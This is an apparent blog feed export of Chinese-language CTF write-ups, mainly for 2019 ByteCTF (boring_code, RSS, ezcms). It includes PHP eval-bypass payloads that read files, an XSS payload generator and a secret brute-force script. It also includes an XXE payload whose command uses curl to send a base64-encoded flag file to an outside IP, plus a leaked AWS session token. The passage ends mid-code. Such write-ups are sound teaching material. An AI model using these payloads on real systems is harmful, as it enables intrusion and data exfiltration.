class="line">AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEIP//////////wEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgUSeA5K2lfCSiSffkkkEI1K/UBr3ujuppACfia/nUalkCIB30VBYpXi/F+vsDuJQzdEX0TQuq2ukNArDLkIthFaOrKokCCLz//////////wEQABoMODk4ODI5NjM2NzYyIgz3SiwxjDyJfOaEcpEq3QE3r5fc6BCD7NBqaP47fjvrlIfN6+2nJ2OL87H5HXAfoDYmubETgltb4Pald7QjvWuXhaTLO1pc7EXHb3kM5gVnkbHLfeA3VVzmLfovKNHbkdQEsXBrTuBkNkyzLzZ/IT7o4oKliK5pQ9AtlwtjUAwMDjd0EHErkAocE3nZccgFk33XCJSYELNtyE9b8wMc/OazJJ6F1Ls3hooH32SUoTpEKf/LJGDK5y5GOxdKT59nDBEGJ87xWmciQZJHIRo+uLOabvlA693RBGPz9LnEASb4+4NAIVyxUDTamNb3qTC6i7joBTq1AVZTquczQh4EvFY/P+fL03/aOq21IbAQFttGqmVwrDJNc3W8E/B6cmvaIuR0xmsfHb+/bhncSXc1VjQsPv1ZiJv16P9gCpf9Y6Xnbp7nmy7yVIvmUnK3WZJgOXS/Amsu/kUbxJT4WxR4d4r3xz1UGqmZfw+0MwDkcxtLMvMSVG5FkwvjP5W0JFG41Tp+wLfSRmN992Fa++PA0RGC55tyh9sbot8aGhnniFHXPoTq45xuMgLyzfc=</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/14/MFto5zXEjc4Zg1p.png" alt="2F725AD4-4498-462D-A130-4DB4C0EC6946.png"></p><p>此处token非常重要，一定要写进配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /root/.aws/credentials</span><br></pre></td></tr></table></figure></p><p>之后下载flag即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://static.l0ca1.xyz/flaaaaaaaaag/flaaaag.txt ./flag.txt --region ap-northeast-1</span><br></pre></td></tr></table></figure></p><h2 id="0x02-math-is-fun1"><a href="#0x02-math-is-fun1" class="headerlink" title="0x02 math-is-fun1"></a>0x02 math-is-fun1</h2><p>解题思路（math-is-fun2 也是这个payload，一打就通）<br>通过2来修改MathJax的配置，从而加载任意js文件，此时引入jsonp来实现xss。</p><p><img src="https://i.loli.net/2019/09/14/w2Uh8JB7SeusMDP.png" alt="A55D141E-1300-4393-BBFE-B0876EABDA65.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(evaljs)</span>:</span></span><br><span class="line">p = <span class="string">"http://47.110.128.101/config?callback="</span></span><br><span class="line">payload=<span class="string">'eval(String.fromCharCode('</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(evaljs)):</span><br><span class="line">payload+=str(ord(evaljs[i]))</span><br><span class="line"><span class="keyword">if</span>(i+<span class="number">1</span>&lt;len(evaljs)):</span><br><span class="line">payload+=<span class="string">','</span></span><br><span class="line">payload+=<span class="string">'));//'</span></span><br><span class="line">payload+=<span class="string">""</span></span><br><span class="line">test = <span class="string">"http://47.110.128.101/challenge?name=abcd%0aMathJax[%27root%27]%3d"</span></span><br><span class="line">payload = test+p+payload+<span class="string">"%26/"</span></span><br><span class="line">print(<span class="string">"[payload] "</span>+payload)</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">arg = sys.argv[<span class="number">2</span>]</span><br><span class="line">getPayload(arg)</span><br></pre></td></tr></table></figure><h2 id="0x03-Flag-Shop"><a href="#0x03-Flag-Shop" class="headerlink" title="0x03 Flag Shop"></a>0x03 Flag Shop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://47.110.15.101/work?name=%3C%25%3d$%26%25%3E&amp;do=%3C%25%3d$%26%25%3E+is+working&amp;SECRET=&#123;SECRET&#125;&quot;</span><br><span class="line"></span><br><span class="line">SECRET =&quot;ec55ce17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">&quot;Cookie&quot;: &quot;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhMDc4ZDU3ZC0wZjZmLTRhNTItODE1MC0yMGYyOTkzYzkxMTUiLCJqa2wiOjI4fQ.gQnZDaa3pKpldiD07vWsX65SO4Ioz5ZawOy5xJPNSEU;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zidian=&quot;1234567890qwertyuiopasdfghjklzxcvbnm&quot;</span><br><span class="line">for jj in range(30):</span><br><span class="line">for i in zidian:</span><br><span class="line">test = SECRET + i</span><br><span class="line"># test = i + SECRET</span><br><span class="line">crackUrl = url.replace(&quot;&#123;SECRET&#125;&quot;,test)</span><br><span class="line">text = requests.get(crackUrl,headers=headers).text</span><br><span class="line">if(&quot;&apos;&quot;+test+&quot; &quot; in text):</span><br><span class="line">SECRET = test</span><br><span class="line">print(&quot;[SECRET] &quot; + SECRET)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;做题最多，但是wp最简略和不全的一次，:)&lt;/p&gt;
&lt;h2 id=&quot;0x01-easy-php&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 bytectf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/</id>
    <published>2019-09-14T15:21:58.000Z</published>
    <updated>2019-09-14T15:28:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。</p><p>文章首发合天实验室，转载请注意版权。</p><h2 id="0x01-boring-code"><a href="#0x01-boring-code" class="headerlink" title="0x01 boring_code"></a>0x01 boring_code</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.125.25.2:9999" target="_blank" rel="noopener">http://112.125.25.2:9999</a></p><h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>题目上来的邮件源码中给了提示，所直接分析目录得到了对应的程序源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">$r = parse_url($url);</span><br><span class="line">print_r($r);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"pass preg_match"</span>;</span><br><span class="line">$code = file_get_contents($url);</span><br><span class="line">print_r($code);</span><br><span class="line"><span class="comment">// 下面这个正则约束了只能是phpinfo();这样的形式</span></span><br><span class="line"><span class="comment">// 所以基本来说 php://input 是不行了</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到这个题目基本是以<code>file_get_contents</code>函数为界限分为了两个部分：</p><ol><li>需要bypass <code>filter_var</code> 、 <code>parse_url</code>  和 <code>preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])</code>  这三个函数的限制；</li><li>需要bypass 在<code>eval</code>函数之前的那一堆正则限制</li></ol><p>首先针对第一个部分，我所知的有三种解决方案:</p><ol><li>购买一个含有baidu.com字符的域名，比如<code>z3r0yu.bytebaidu.com</code> （刚开始bypass太困难，5am3师傅咬了咬牙直接就买了，氪金解决一切啊）</li><li>使用ftp协议，<code>ftp://ip:port,baidu.com:80/filename.txt</code></li><li>使用一个百度的任意跳转的漏洞（还真有）<code>post.baidu.com</code> ，具体可以参考 <a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">链接</a></li></ol><p>第一部分过了之后就需要bypass对shell的限制了，因为此处限制的比较死，所以之前的那些执行方式就统统失效了</p><p>首先先构思一个简单的payload，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(&apos;.&apos;))));</span><br></pre></td></tr></table></figure></p><p>因为 <code>.</code> 对应的是 chr(46)，所以payload就可以是如下的形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(46)))));</span><br></pre></td></tr></table></figure></p><p>但是正则表达式限制了不能够在函数中使用参数，所以之后我们可以看看系统中还剩什么函数可以使用</p><p>可以使用如下方式来进行初步fuzz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-/i'</span>, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure><p>可以看到基本使用函数来获取外部导入变量是不可能的了，但是关注到一个函数 <code>phpversion()</code> 可以返回对应的php版本，也就是 7 这个数字</p><p>那么接下来就是数学题了，如何利用剩下的数学函数来构造出数字 46 , 最终利用如下方式构造出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</span><br></pre></td></tr></table></figure><p>从而得到了 <code>.</code></p><p>PS: 随后也fuzz出 <code>localeconv()</code> 函数的返回值中有一个 <code>.</code> (fuzz脚本附在最后)</p><p>所以此时已经可以可以完成对当前目录文件的读取，但是题目提示文件是在上一层目录中，所以我们还需要构造 <code>..</code> 来跳到上一级目录，此处刚开始也卡了好久，但随后突然想到 <code>ls -a</code> 之后系统不就自带两点，这不是系统特性嘛，所以就有了如下paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/fnAD8hJCj4UQeMN.png" alt="2E4F324A-D809-4F3C-8168-0829EDF82DF6.png"></p><p>之后就是使用<code>chr</code>函数进行跳到上一级目录，但是跳完还有一个问题，就是该怎么再次获取一个<code>.</code>出来，<code>chr</code>函数的返回值是布尔值，那么之后就将布尔值True作为参数放在fuzzer中看能得到什么结果，最后fuzz轮次不一样时发现 <code>time</code> 函数返回的结果也不一样，随后查了一下手册，便意识到可以使用这种方式来进行构造一个46出来，所以构造出如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(time(1))</span><br></pre></td></tr></table></figure><p>综上就可以构造出payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure></p><p>另一种payload可以构造如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure></p><p>所以这题再限制一下长度估计会更难</p><p>我在解题时使用的粗糙fuzzer<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_/i'</span>, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print_r($i_need_func);</span></span><br><span class="line"><span class="comment">// $res=array();</span></span><br><span class="line"><span class="comment">// $t=0;</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count($i_need_func); $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(!is_null($i_need_func[$i]()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $i_need_func[$i];</span><br><span class="line">            var_dump($i_need_func[$i]());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if (var_dump(print_r($i_need_func[$i](chr(46))))) &#123;</span></span><br><span class="line">        <span class="comment">//     echo $i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $res[$t]=$i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $t++;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (\Throwable $th) &#123;</span><br><span class="line">    <span class="comment">//throw $th;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r($res);</span></span><br></pre></td></tr></table></figure></p><p>最后再简要提一下我看到的另外两种payload</p><p>两中payload都是利用了hash的特征</p><p>paylaod1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure></p><p>原理：hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</p><p><img src="https://i.loli.net/2019/09/14/qXTpclsheSrxAUN.png" alt="D4BB0F3D-0D73-41EC-A68C-F5374EA53376.png"></p><p>payload2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure></p><p>原理：crypt(serialize(array())) 原因同上</p><p><img src="https://i.loli.net/2019/09/14/AviDaUmQtSrYs4I.png" alt="2C65B93D-2D28-4C12-8E88-ADF9C90C5DF6.png"></p><p>PS: 这种也可以利用fuzzer发现，就像发现time函数那样，检测轮次中结果的变化即可</p><h2 id="0x02-RSS"><a href="#0x02-RSS" class="headerlink" title="0x02 RSS"></a>0x02 RSS</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.126.96.50:9999" target="_blank" rel="noopener">http://112.126.96.50:9999</a></p><h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>这题基本是个原题，只是 <code>create_function</code> 的位置改变了，任意文件读取改成了xxe来完成，域名限制的突破也可以使用购买域名来实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /fetch HTTP/1.1</span><br><span class="line">Host: 112.126.96.50:9999</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://112.126.96.50:9999/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">rss_url=http://z3r0yu.bytebaidu.com:2233/exp7.xml</span><br></pre></td></tr></table></figure><p>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!ENTITY test SYSTEM "http://localhost/rss_in_order?rss_url=http%3a%2f%2f47.90.204.28%3a2233%2ffile.xml&amp;order=description%2c%22c%22)%3b%7dsystem(%22curl+http%3a%2f%2f47.90.204.28%3a2233%2f%60cat%20%2fflag_eb8ba2eb07702e69963a7d6ab8669134%20%7c%20base64%60%22)%3b%2f%2f"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">atom:link</span> <span class="attr">href</span>=<span class="string">"http://xz.aliyun.com/forum/feed/"</span> <span class="attr">rel</span>=<span class="string">"self"</span>&gt;</span><span class="tag">&lt;/<span class="name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">language</span>&gt;</span>zh-hans<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>利用Excel power query实现远程DDE执行<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2019-0221—Apache Tomcat SSI printenv指令中的XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>CVE-2019-0221—Apache Tomcat SSI printenv指令中的XSS<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Jun 2019 09:09:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/14/ZeRuhaHM8xNiFws.png" alt="58C0EE14-8370-49B4-85A6-EF1B67EDB1ED.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytectf&#123;61878fa75f293f179a895bf74e358a4f&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-ezcms"><a href="#0x03-ezcms" class="headerlink" title="0x03 ezcms"></a>0x03 ezcms</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.126.102.158:9999" target="_blank" rel="noopener">http://112.126.102.158:9999</a></p><h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>首先是一个源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">112.126.102.158:9999/www.zip</span><br></pre></td></tr></table></figure></p><p>看到<code>config.php</code>中的<code>is_admin</code>函数时，就基本可以判断，此处可以使用hash扩展攻击bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">"admin"</span> &amp;&amp; $password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.$username.$password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  